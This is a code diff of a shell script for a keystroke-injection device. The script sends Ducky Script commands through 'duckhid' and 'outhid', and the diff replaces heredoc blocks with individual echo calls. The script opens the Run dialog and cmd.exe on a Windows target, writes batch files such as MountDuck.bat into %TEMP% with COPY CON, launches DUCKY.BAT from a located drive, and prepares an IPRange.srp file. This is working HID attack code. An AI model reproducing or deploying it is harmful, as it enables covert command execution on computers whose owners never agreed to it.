@@ -15,22 +15,21 @@ led_blink 11 # 10 to 20 blinks the red LED.
 
 function onKeyboardUp()
 {
-cat <<- EOF | duckhid
-DELAY 500
-GUI r
-DELAY 200
-STRING cmd.exe
-ENTER
-DELAY 300
-STRING CD /D "%TEMP%"
-ENTER
-STRING ERASE MountDuck.bat
-ENTER
-STRING COPY CON MountDuck.bat
-ENTER
-STRING @echo off
-ENTER
-EOF
+sleep 0.5
+echo GUI r | duckhid
+sleep 0.2
+echo STRING cmd.exe | duckhid
+echo "RETURN" | duckhid
+sleep 0.3
+echo STRING CD /D \"%TEMP%\" | duckhid
+echo "RETURN" | duckhid
+sleep 0.5
+echo STRING ERASE MountDuck.bat | duckhid
+echo "RETURN" | duckhid
+echo STRING COPY CON MountDuck.bat | duckhid
+echo "RETURN" | duckhid
+echo STRING @echo off | duckhid
+echo "RETURN" | duckhid
 
 led_blink 12
 
@@ -67,23 +66,19 @@ echo "if not \"%Drive%\" == \" \" %Drive%:\DUCKY.BAT") | outhid
 
 led_blink 13
 
-cat <<- EOF | duckhid
-STRING PAUSE
-ENTER
-STRING EXIT
-ENTER
-CONTROL z
-ENTER
-STRING CLS
-ENTER
-EOF
+echo STRING PAUSE | duckhid
+echo "RETURN" | duckhid
+echo STRING EXIT | duckhid
+echo "RETURN" | duckhid
+echo "CONTROL" z | duckhid
+echo "RETURN" | duckhid
+echo STRING CLS | duckhid
+echo "RETURN" | duckhid
 
-cat <<- EOF | duckhid
-STRING ERASE IPRange.srp
-ENTER
-STRING COPY CON IPRange.srp
-ENTER
-EOF
+echo STRING ERASE IPRange.srp | duckhid
+echo "RETURN" | duckhid
+echo STRING COPY CON IPRange.srp | duckhid
+echo "RETURN" | duckhid
 
 led_blink 1
 
@@ -93,14 +88,12 @@ led_blink 14
 
 cat /tmp/out | outhid
 
-cat <<- EOF | duckhid
-CONTROL z
-ENTER
-STRING CLS
-ENTER
-STRING MOUNTDUCK
-ENTER
-EOF
+echo "CONTROL" z | duckhid
+echo "RETURN" | duckhid
+echo STRING CLS | duckhid
+echo "RETURN" | duckhid
+echo STRING MOUNTDUCK | duckhid
+echo "RETURN" | duckhid
 
 led_blink 255
 
